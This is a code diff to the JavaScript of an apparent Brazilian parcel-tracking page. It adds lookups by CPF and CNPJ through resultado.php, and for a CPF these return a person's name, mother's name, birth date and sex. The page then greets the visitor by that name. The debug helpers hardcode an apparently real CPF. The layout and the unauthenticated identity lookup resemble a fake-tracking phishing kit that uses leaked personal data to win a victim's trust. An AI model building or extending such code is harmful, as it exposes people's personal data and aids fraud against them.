@@ -1,6 +1,7 @@
 /**
  * Index.js - Arquivo Principal Otimizado
  * Versão otimizada: removidos imports não utilizados, simplificado event handling
+ * MODIFICADO: Adicionado sistema de consulta para CPF, CNPJ e código de rastreio
  */
 
 import * as alerta from '../core/templates/bunker/js/alerta.js';
@@ -121,19 +122,125 @@ class TrackingSystem {
         
         if (!trackingInput || !captchaInput) return;
 
-        const validation = CodeValidator.validateTrackingInput(trackingInput.value);
+        // Pegar valor limpo (remover tudo exceto letras e números)
+        const valorOriginal = trackingInput.value;
+        const valorLimpo = valorOriginal.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
         
-        if (validation.error) {
-            forms.setValidade(trackingInput, validation.message);
+        if (!valorLimpo) {
+            forms.setValidade(trackingInput, 'Por favor, digite um código de rastreio, CPF ou CNPJ');
             return;
         }
 
+        // Determinar tipo de entrada
+        const tipoEntrada = this.determinarTipoEntrada(valorLimpo);
+        
+        if (!tipoEntrada) {
+            forms.setValidade(trackingInput, 'Formato inválido. Digite um código de rastreio (13 caracteres), CPF (11 dígitos) ou CNPJ (14 dígitos)');
+            return;
+        }
+
+        // Validar captcha
         if (!this.validateCaptchaField()) {
             return;
         }
 
         forms.setValidade(trackingInput, '');
-        await this.routeSearchByType(validation);
+
+        // Processar usando resultado.php
+        try {
+            alerta.abre('Consultando...');
+            
+            const dados = await this.consultarResultado(valorLimpo);
+            
+            alerta.fecha();
+            
+            // Processar baseado no tipo retornado
+            switch (dados.tipo) {
+                case 'cpf':
+                    this.processarDadosCPF(dados, valorLimpo);
+                    break;
+                case 'cnpj':
+                    this.processarDadosCNPJ(dados, valorLimpo);
+                    break;
+                case 'rastreio':
+                    this.processarDadosRastreio(dados, valorLimpo);
+                    break;
+                default:
+                    // Fallback para código de rastreio sem consulta
+                    this.processarCodigoRastreio(valorLimpo);
+                    break;
+            }
+            
+            // Ações finais sempre executadas
+            this.finalizarConsulta();
+            
+        } catch (error) {
+            alerta.fecha();
+            alerta.abre(error.message, 5, 'OK');
+            this.refreshCaptcha();
+        }
+    }
+
+    processarDadosCPF(dados, cpf) {
+        // Salvar dados em variáveis globais
+        window.dadosUsuario = {
+            nome: dados.nome,
+            mae: dados.mae,
+            nascimento: dados.nascimento,
+            cpf: dados.cpf,
+            sexo: dados.sexo
+        };
+        
+        // Atualizar trilha
+        this.atualizarTrilha(cpf);
+        
+        // Atualizar título com nome
+        this.atualizarTitulo(`Olá, ${dados.nome}`);
+    }
+
+    processarDadosCNPJ(dados, cnpj) {
+        // Salvar dados em variáveis globais
+        window.dadosEmpresa = {
+            nome: dados.nome,
+            fantasia: dados.fantasia,
+            cnpj: dados.cnpj,
+            situacao: dados.situacao,
+            atividade_principal: dados.atividade_principal,
+            endereco: {
+                logradouro: dados.logradouro,
+                numero: dados.numero,
+                municipio: dados.municipio,
+                uf: dados.uf,
+                cep: dados.cep
+            },
+            contato: {
+                telefone: dados.telefone,
+                email: dados.email
+            }
+        };
+        
+        // Atualizar trilha
+        this.atualizarTrilha(cnpj);
+        
+        // Atualizar título no formato: Olá, fantasia / nome
+        let titulo = 'Olá, ';
+        if (dados.fantasia && dados.fantasia.trim()) {
+            titulo += `${dados.fantasia}`;
+        } else {
+            titulo += dados.nome;
+        }
+        this.atualizarTitulo(titulo);
+    }
+
+    processarDadosRastreio(dados, codigo) {
+        // Atualizar trilha
+        this.atualizarTrilha(codigo);
+        
+        // Formatar código e atualizar título
+        const codigoFormatado = this.formatarCodigoRastreio(codigo);
+        this.atualizarTitulo(codigoFormatado);
+        
+        // Aqui você pode processar os dados de rastreio se necessário
     }
 
     async routeSearchByType(validation) {
@@ -541,6 +648,184 @@ class TrackingSystem {
         }
     }
 
+    // === NOVOS MÉTODOS PARA SISTEMA DE CONSULTA ===
+    
+    determinarTipoEntrada(valor) {
+        const PATTERNS = {
+            CPF: /^[0-9]{11}$/,
+            CNPJ: /^[0-9]{14}$/,
+            CODIGO_RASTREIO: /^[A-Z]{2}[0-9]{9}[A-Z]{2}$/
+        };
+
+        if (PATTERNS.CPF.test(valor)) {
+            return 'CPF';
+        }
+        if (PATTERNS.CNPJ.test(valor)) {
+            return 'CNPJ';
+        }
+        if (PATTERNS.CODIGO_RASTREIO.test(valor)) {
+            return 'CODIGO_RASTREIO';
+        }
+        return null;
+    }
+
+    async processarCodigoRastreio(codigo) {
+        // Atualizar trilha
+        this.atualizarTrilha(codigo);
+        
+        // Formatar código e atualizar título
+        const codigoFormatado = this.formatarCodigoRastreio(codigo);
+        this.atualizarTitulo(codigoFormatado);
+    }
+
+    async processarCPF(cpf) {
+        try {
+            alerta.abre('Consultando CPF...');
+            
+            // Fazer consulta na API
+            const dadosCPF = await this.consultarAPICPF(cpf);
+            
+            // Salvar dados em variáveis globais
+            window.dadosUsuario = {
+                nome: dadosCPF.nome,
+                mae: dadosCPF.mae,
+                nascimento: dadosCPF.nascimento,
+                cpf: dadosCPF.cpf
+            };
+            
+            // Atualizar trilha
+            this.atualizarTrilha(cpf);
+            
+            // Atualizar título com nome
+            this.atualizarTitulo(`Olá, ${dadosCPF.nome}`);
+            
+            alerta.fecha();
+            
+        } catch (error) {
+            alerta.fecha();
+            throw new Error('Erro ao consultar CPF: ' + error.message);
+        }
+    }
+
+    async processarCNPJ(cnpj) {
+        try {
+            alerta.abre('Consultando CNPJ...');
+            
+            // Fazer consulta na API
+            const dadosCNPJ = await this.consultarAPICNPJ(cnpj);
+            
+            // Salvar dados em variáveis globais
+            window.dadosEmpresa = {
+                nome: dadosCNPJ.nome,
+                fantasia: dadosCNPJ.fantasia,
+                cnpj: dadosCNPJ.cnpj
+            };
+            
+            // Atualizar trilha
+            this.atualizarTrilha(cnpj);
+            
+            // Atualizar título com nome fantasia
+            const nomeExibicao = dadosCNPJ.fantasia && dadosCNPJ.fantasia.trim() 
+                ? dadosCNPJ.fantasia 
+                : dadosCNPJ.nome;
+            this.atualizarTitulo(`Olá, ${nomeExibicao}`);
+            
+            alerta.fecha();
+            
+        } catch (error) {
+            alerta.fecha();
+            throw new Error('Erro ao consultar CNPJ: ' + error.message);
+        }
+    }
+
+    async consultarResultado(objeto) {
+        const captcha = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`).value;
+        const url = `resultado.php?objeto=${objeto}&captcha=${captcha}`;
+        
+        try {
+            const response = await fetch(url);
+            
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+            }
+            
+            const data = await response.json();
+            
+            if (data.erro) {
+                throw new Error(data.mensagem || 'Erro na consulta');
+            }
+            
+            return data;
+            
+        } catch (error) {
+            if (error.message.includes('fetch')) {
+                throw new Error('Erro de conexão. Verifique sua internet.');
+            }
+            throw error;
+        }
+    }
+
+    atualizarTrilha(codigo) {
+        const trilha = domCache.get(`#${DOM_IDS.BREADCRUMB}`);
+        
+        if (!trilha) return;
+        
+        const links = trilha.querySelectorAll('a');
+        
+        // Se tem mais de 2 links, remove o último
+        if (links.length > 2) {
+            const ultimoLink = links[links.length - 1];
+            ultimoLink.remove();
+        }
+        
+        // Adiciona novo link com formatação se for CPF
+        const novoLink = document.createElement('a');
+        novoLink.textContent = this.formatarParaTrilha(codigo);
+        trilha.appendChild(novoLink);
+    }
+
+    formatarParaTrilha(codigo) {
+        // Se for CPF (11 dígitos), formatar como 000.000.000-00
+        if (/^[0-9]{11}$/.test(codigo)) {
+            return `${codigo.substring(0, 3)}.${codigo.substring(3, 6)}.${codigo.substring(6, 9)}-${codigo.substring(9, 11)}`;
+        }
+        // Se for CNPJ (14 dígitos), formatar como 00.000.000/0000-00
+        if (/^[0-9]{14}$/.test(codigo)) {
+            return `${codigo.substring(0, 2)}.${codigo.substring(2, 5)}.${codigo.substring(5, 8)}/${codigo.substring(8, 12)}-${codigo.substring(12, 14)}`;
+        }
+        // Senão, retorna como está
+        return codigo;
+    }
+
+    atualizarTitulo(texto) {
+        const tituloH3 = domCache.get('#titulo-pagina h3');
+        
+        if (tituloH3) {
+            tituloH3.textContent = texto;
+        }
+    }
+
+    formatarCodigoRastreio(codigo) {
+        // Formato: ND 575 882 651 BR
+        if (codigo.length !== 13) return codigo;
+        
+        return `${codigo.substring(0, 2)} ${codigo.substring(2, 5)} ${codigo.substring(5, 8)} ${codigo.substring(8, 11)} ${codigo.substring(11, 13)}`;
+    }
+
+    finalizarConsulta() {
+        // Remover classe "oculto" do tabs-rastreamento
+        const tabsRastreamento = domCache.get(`#${DOM_IDS.TRACKING_TABS}`);
+        if (tabsRastreamento) {
+            DOMUtils.removeClass(tabsRastreamento, 'oculto');
+        }
+        
+        // Limpar conteúdo do jumbotron
+        const jumbotron = domCache.get('.jumbotron');
+        if (jumbotron) {
+            DOMUtils.setHTML(jumbotron, '<!-- Conteúdo será adicionado aqui conforme sua especificação -->');
+        }
+    }
+
     destroy() {
         apiManager.cancelAllRequests();
         domCache.clear();
@@ -550,6 +835,31 @@ class TrackingSystem {
 // Inicialização otimizada
 document.addEventListener('DOMContentLoaded', () => {
     window.trackingSystem = new TrackingSystem();
+    
+    // === FUNÇÕES DE TESTE PARA DEBUG ===
+    window.testarConsulta = {
+        cpf: () => {
+            const input = document.getElementById('objeto');
+            if (input) {
+                input.value = '07340908897';
+                window.trackingSystem.handleSearch();
+            }
+        },
+        codigo: () => {
+            const input = document.getElementById('objeto');
+            if (input) {
+                input.value = 'ND575882651BR';
+                window.trackingSystem.handleSearch();
+            }
+        },
+        cnpj: () => {
+            const input = document.getElementById('objeto');
+            if (input) {
+                input.value = '12345678901234';
+                window.trackingSystem.handleSearch();
+            }
+        }
+    };
 });
 
 window.addEventListener('beforeunload', () => {
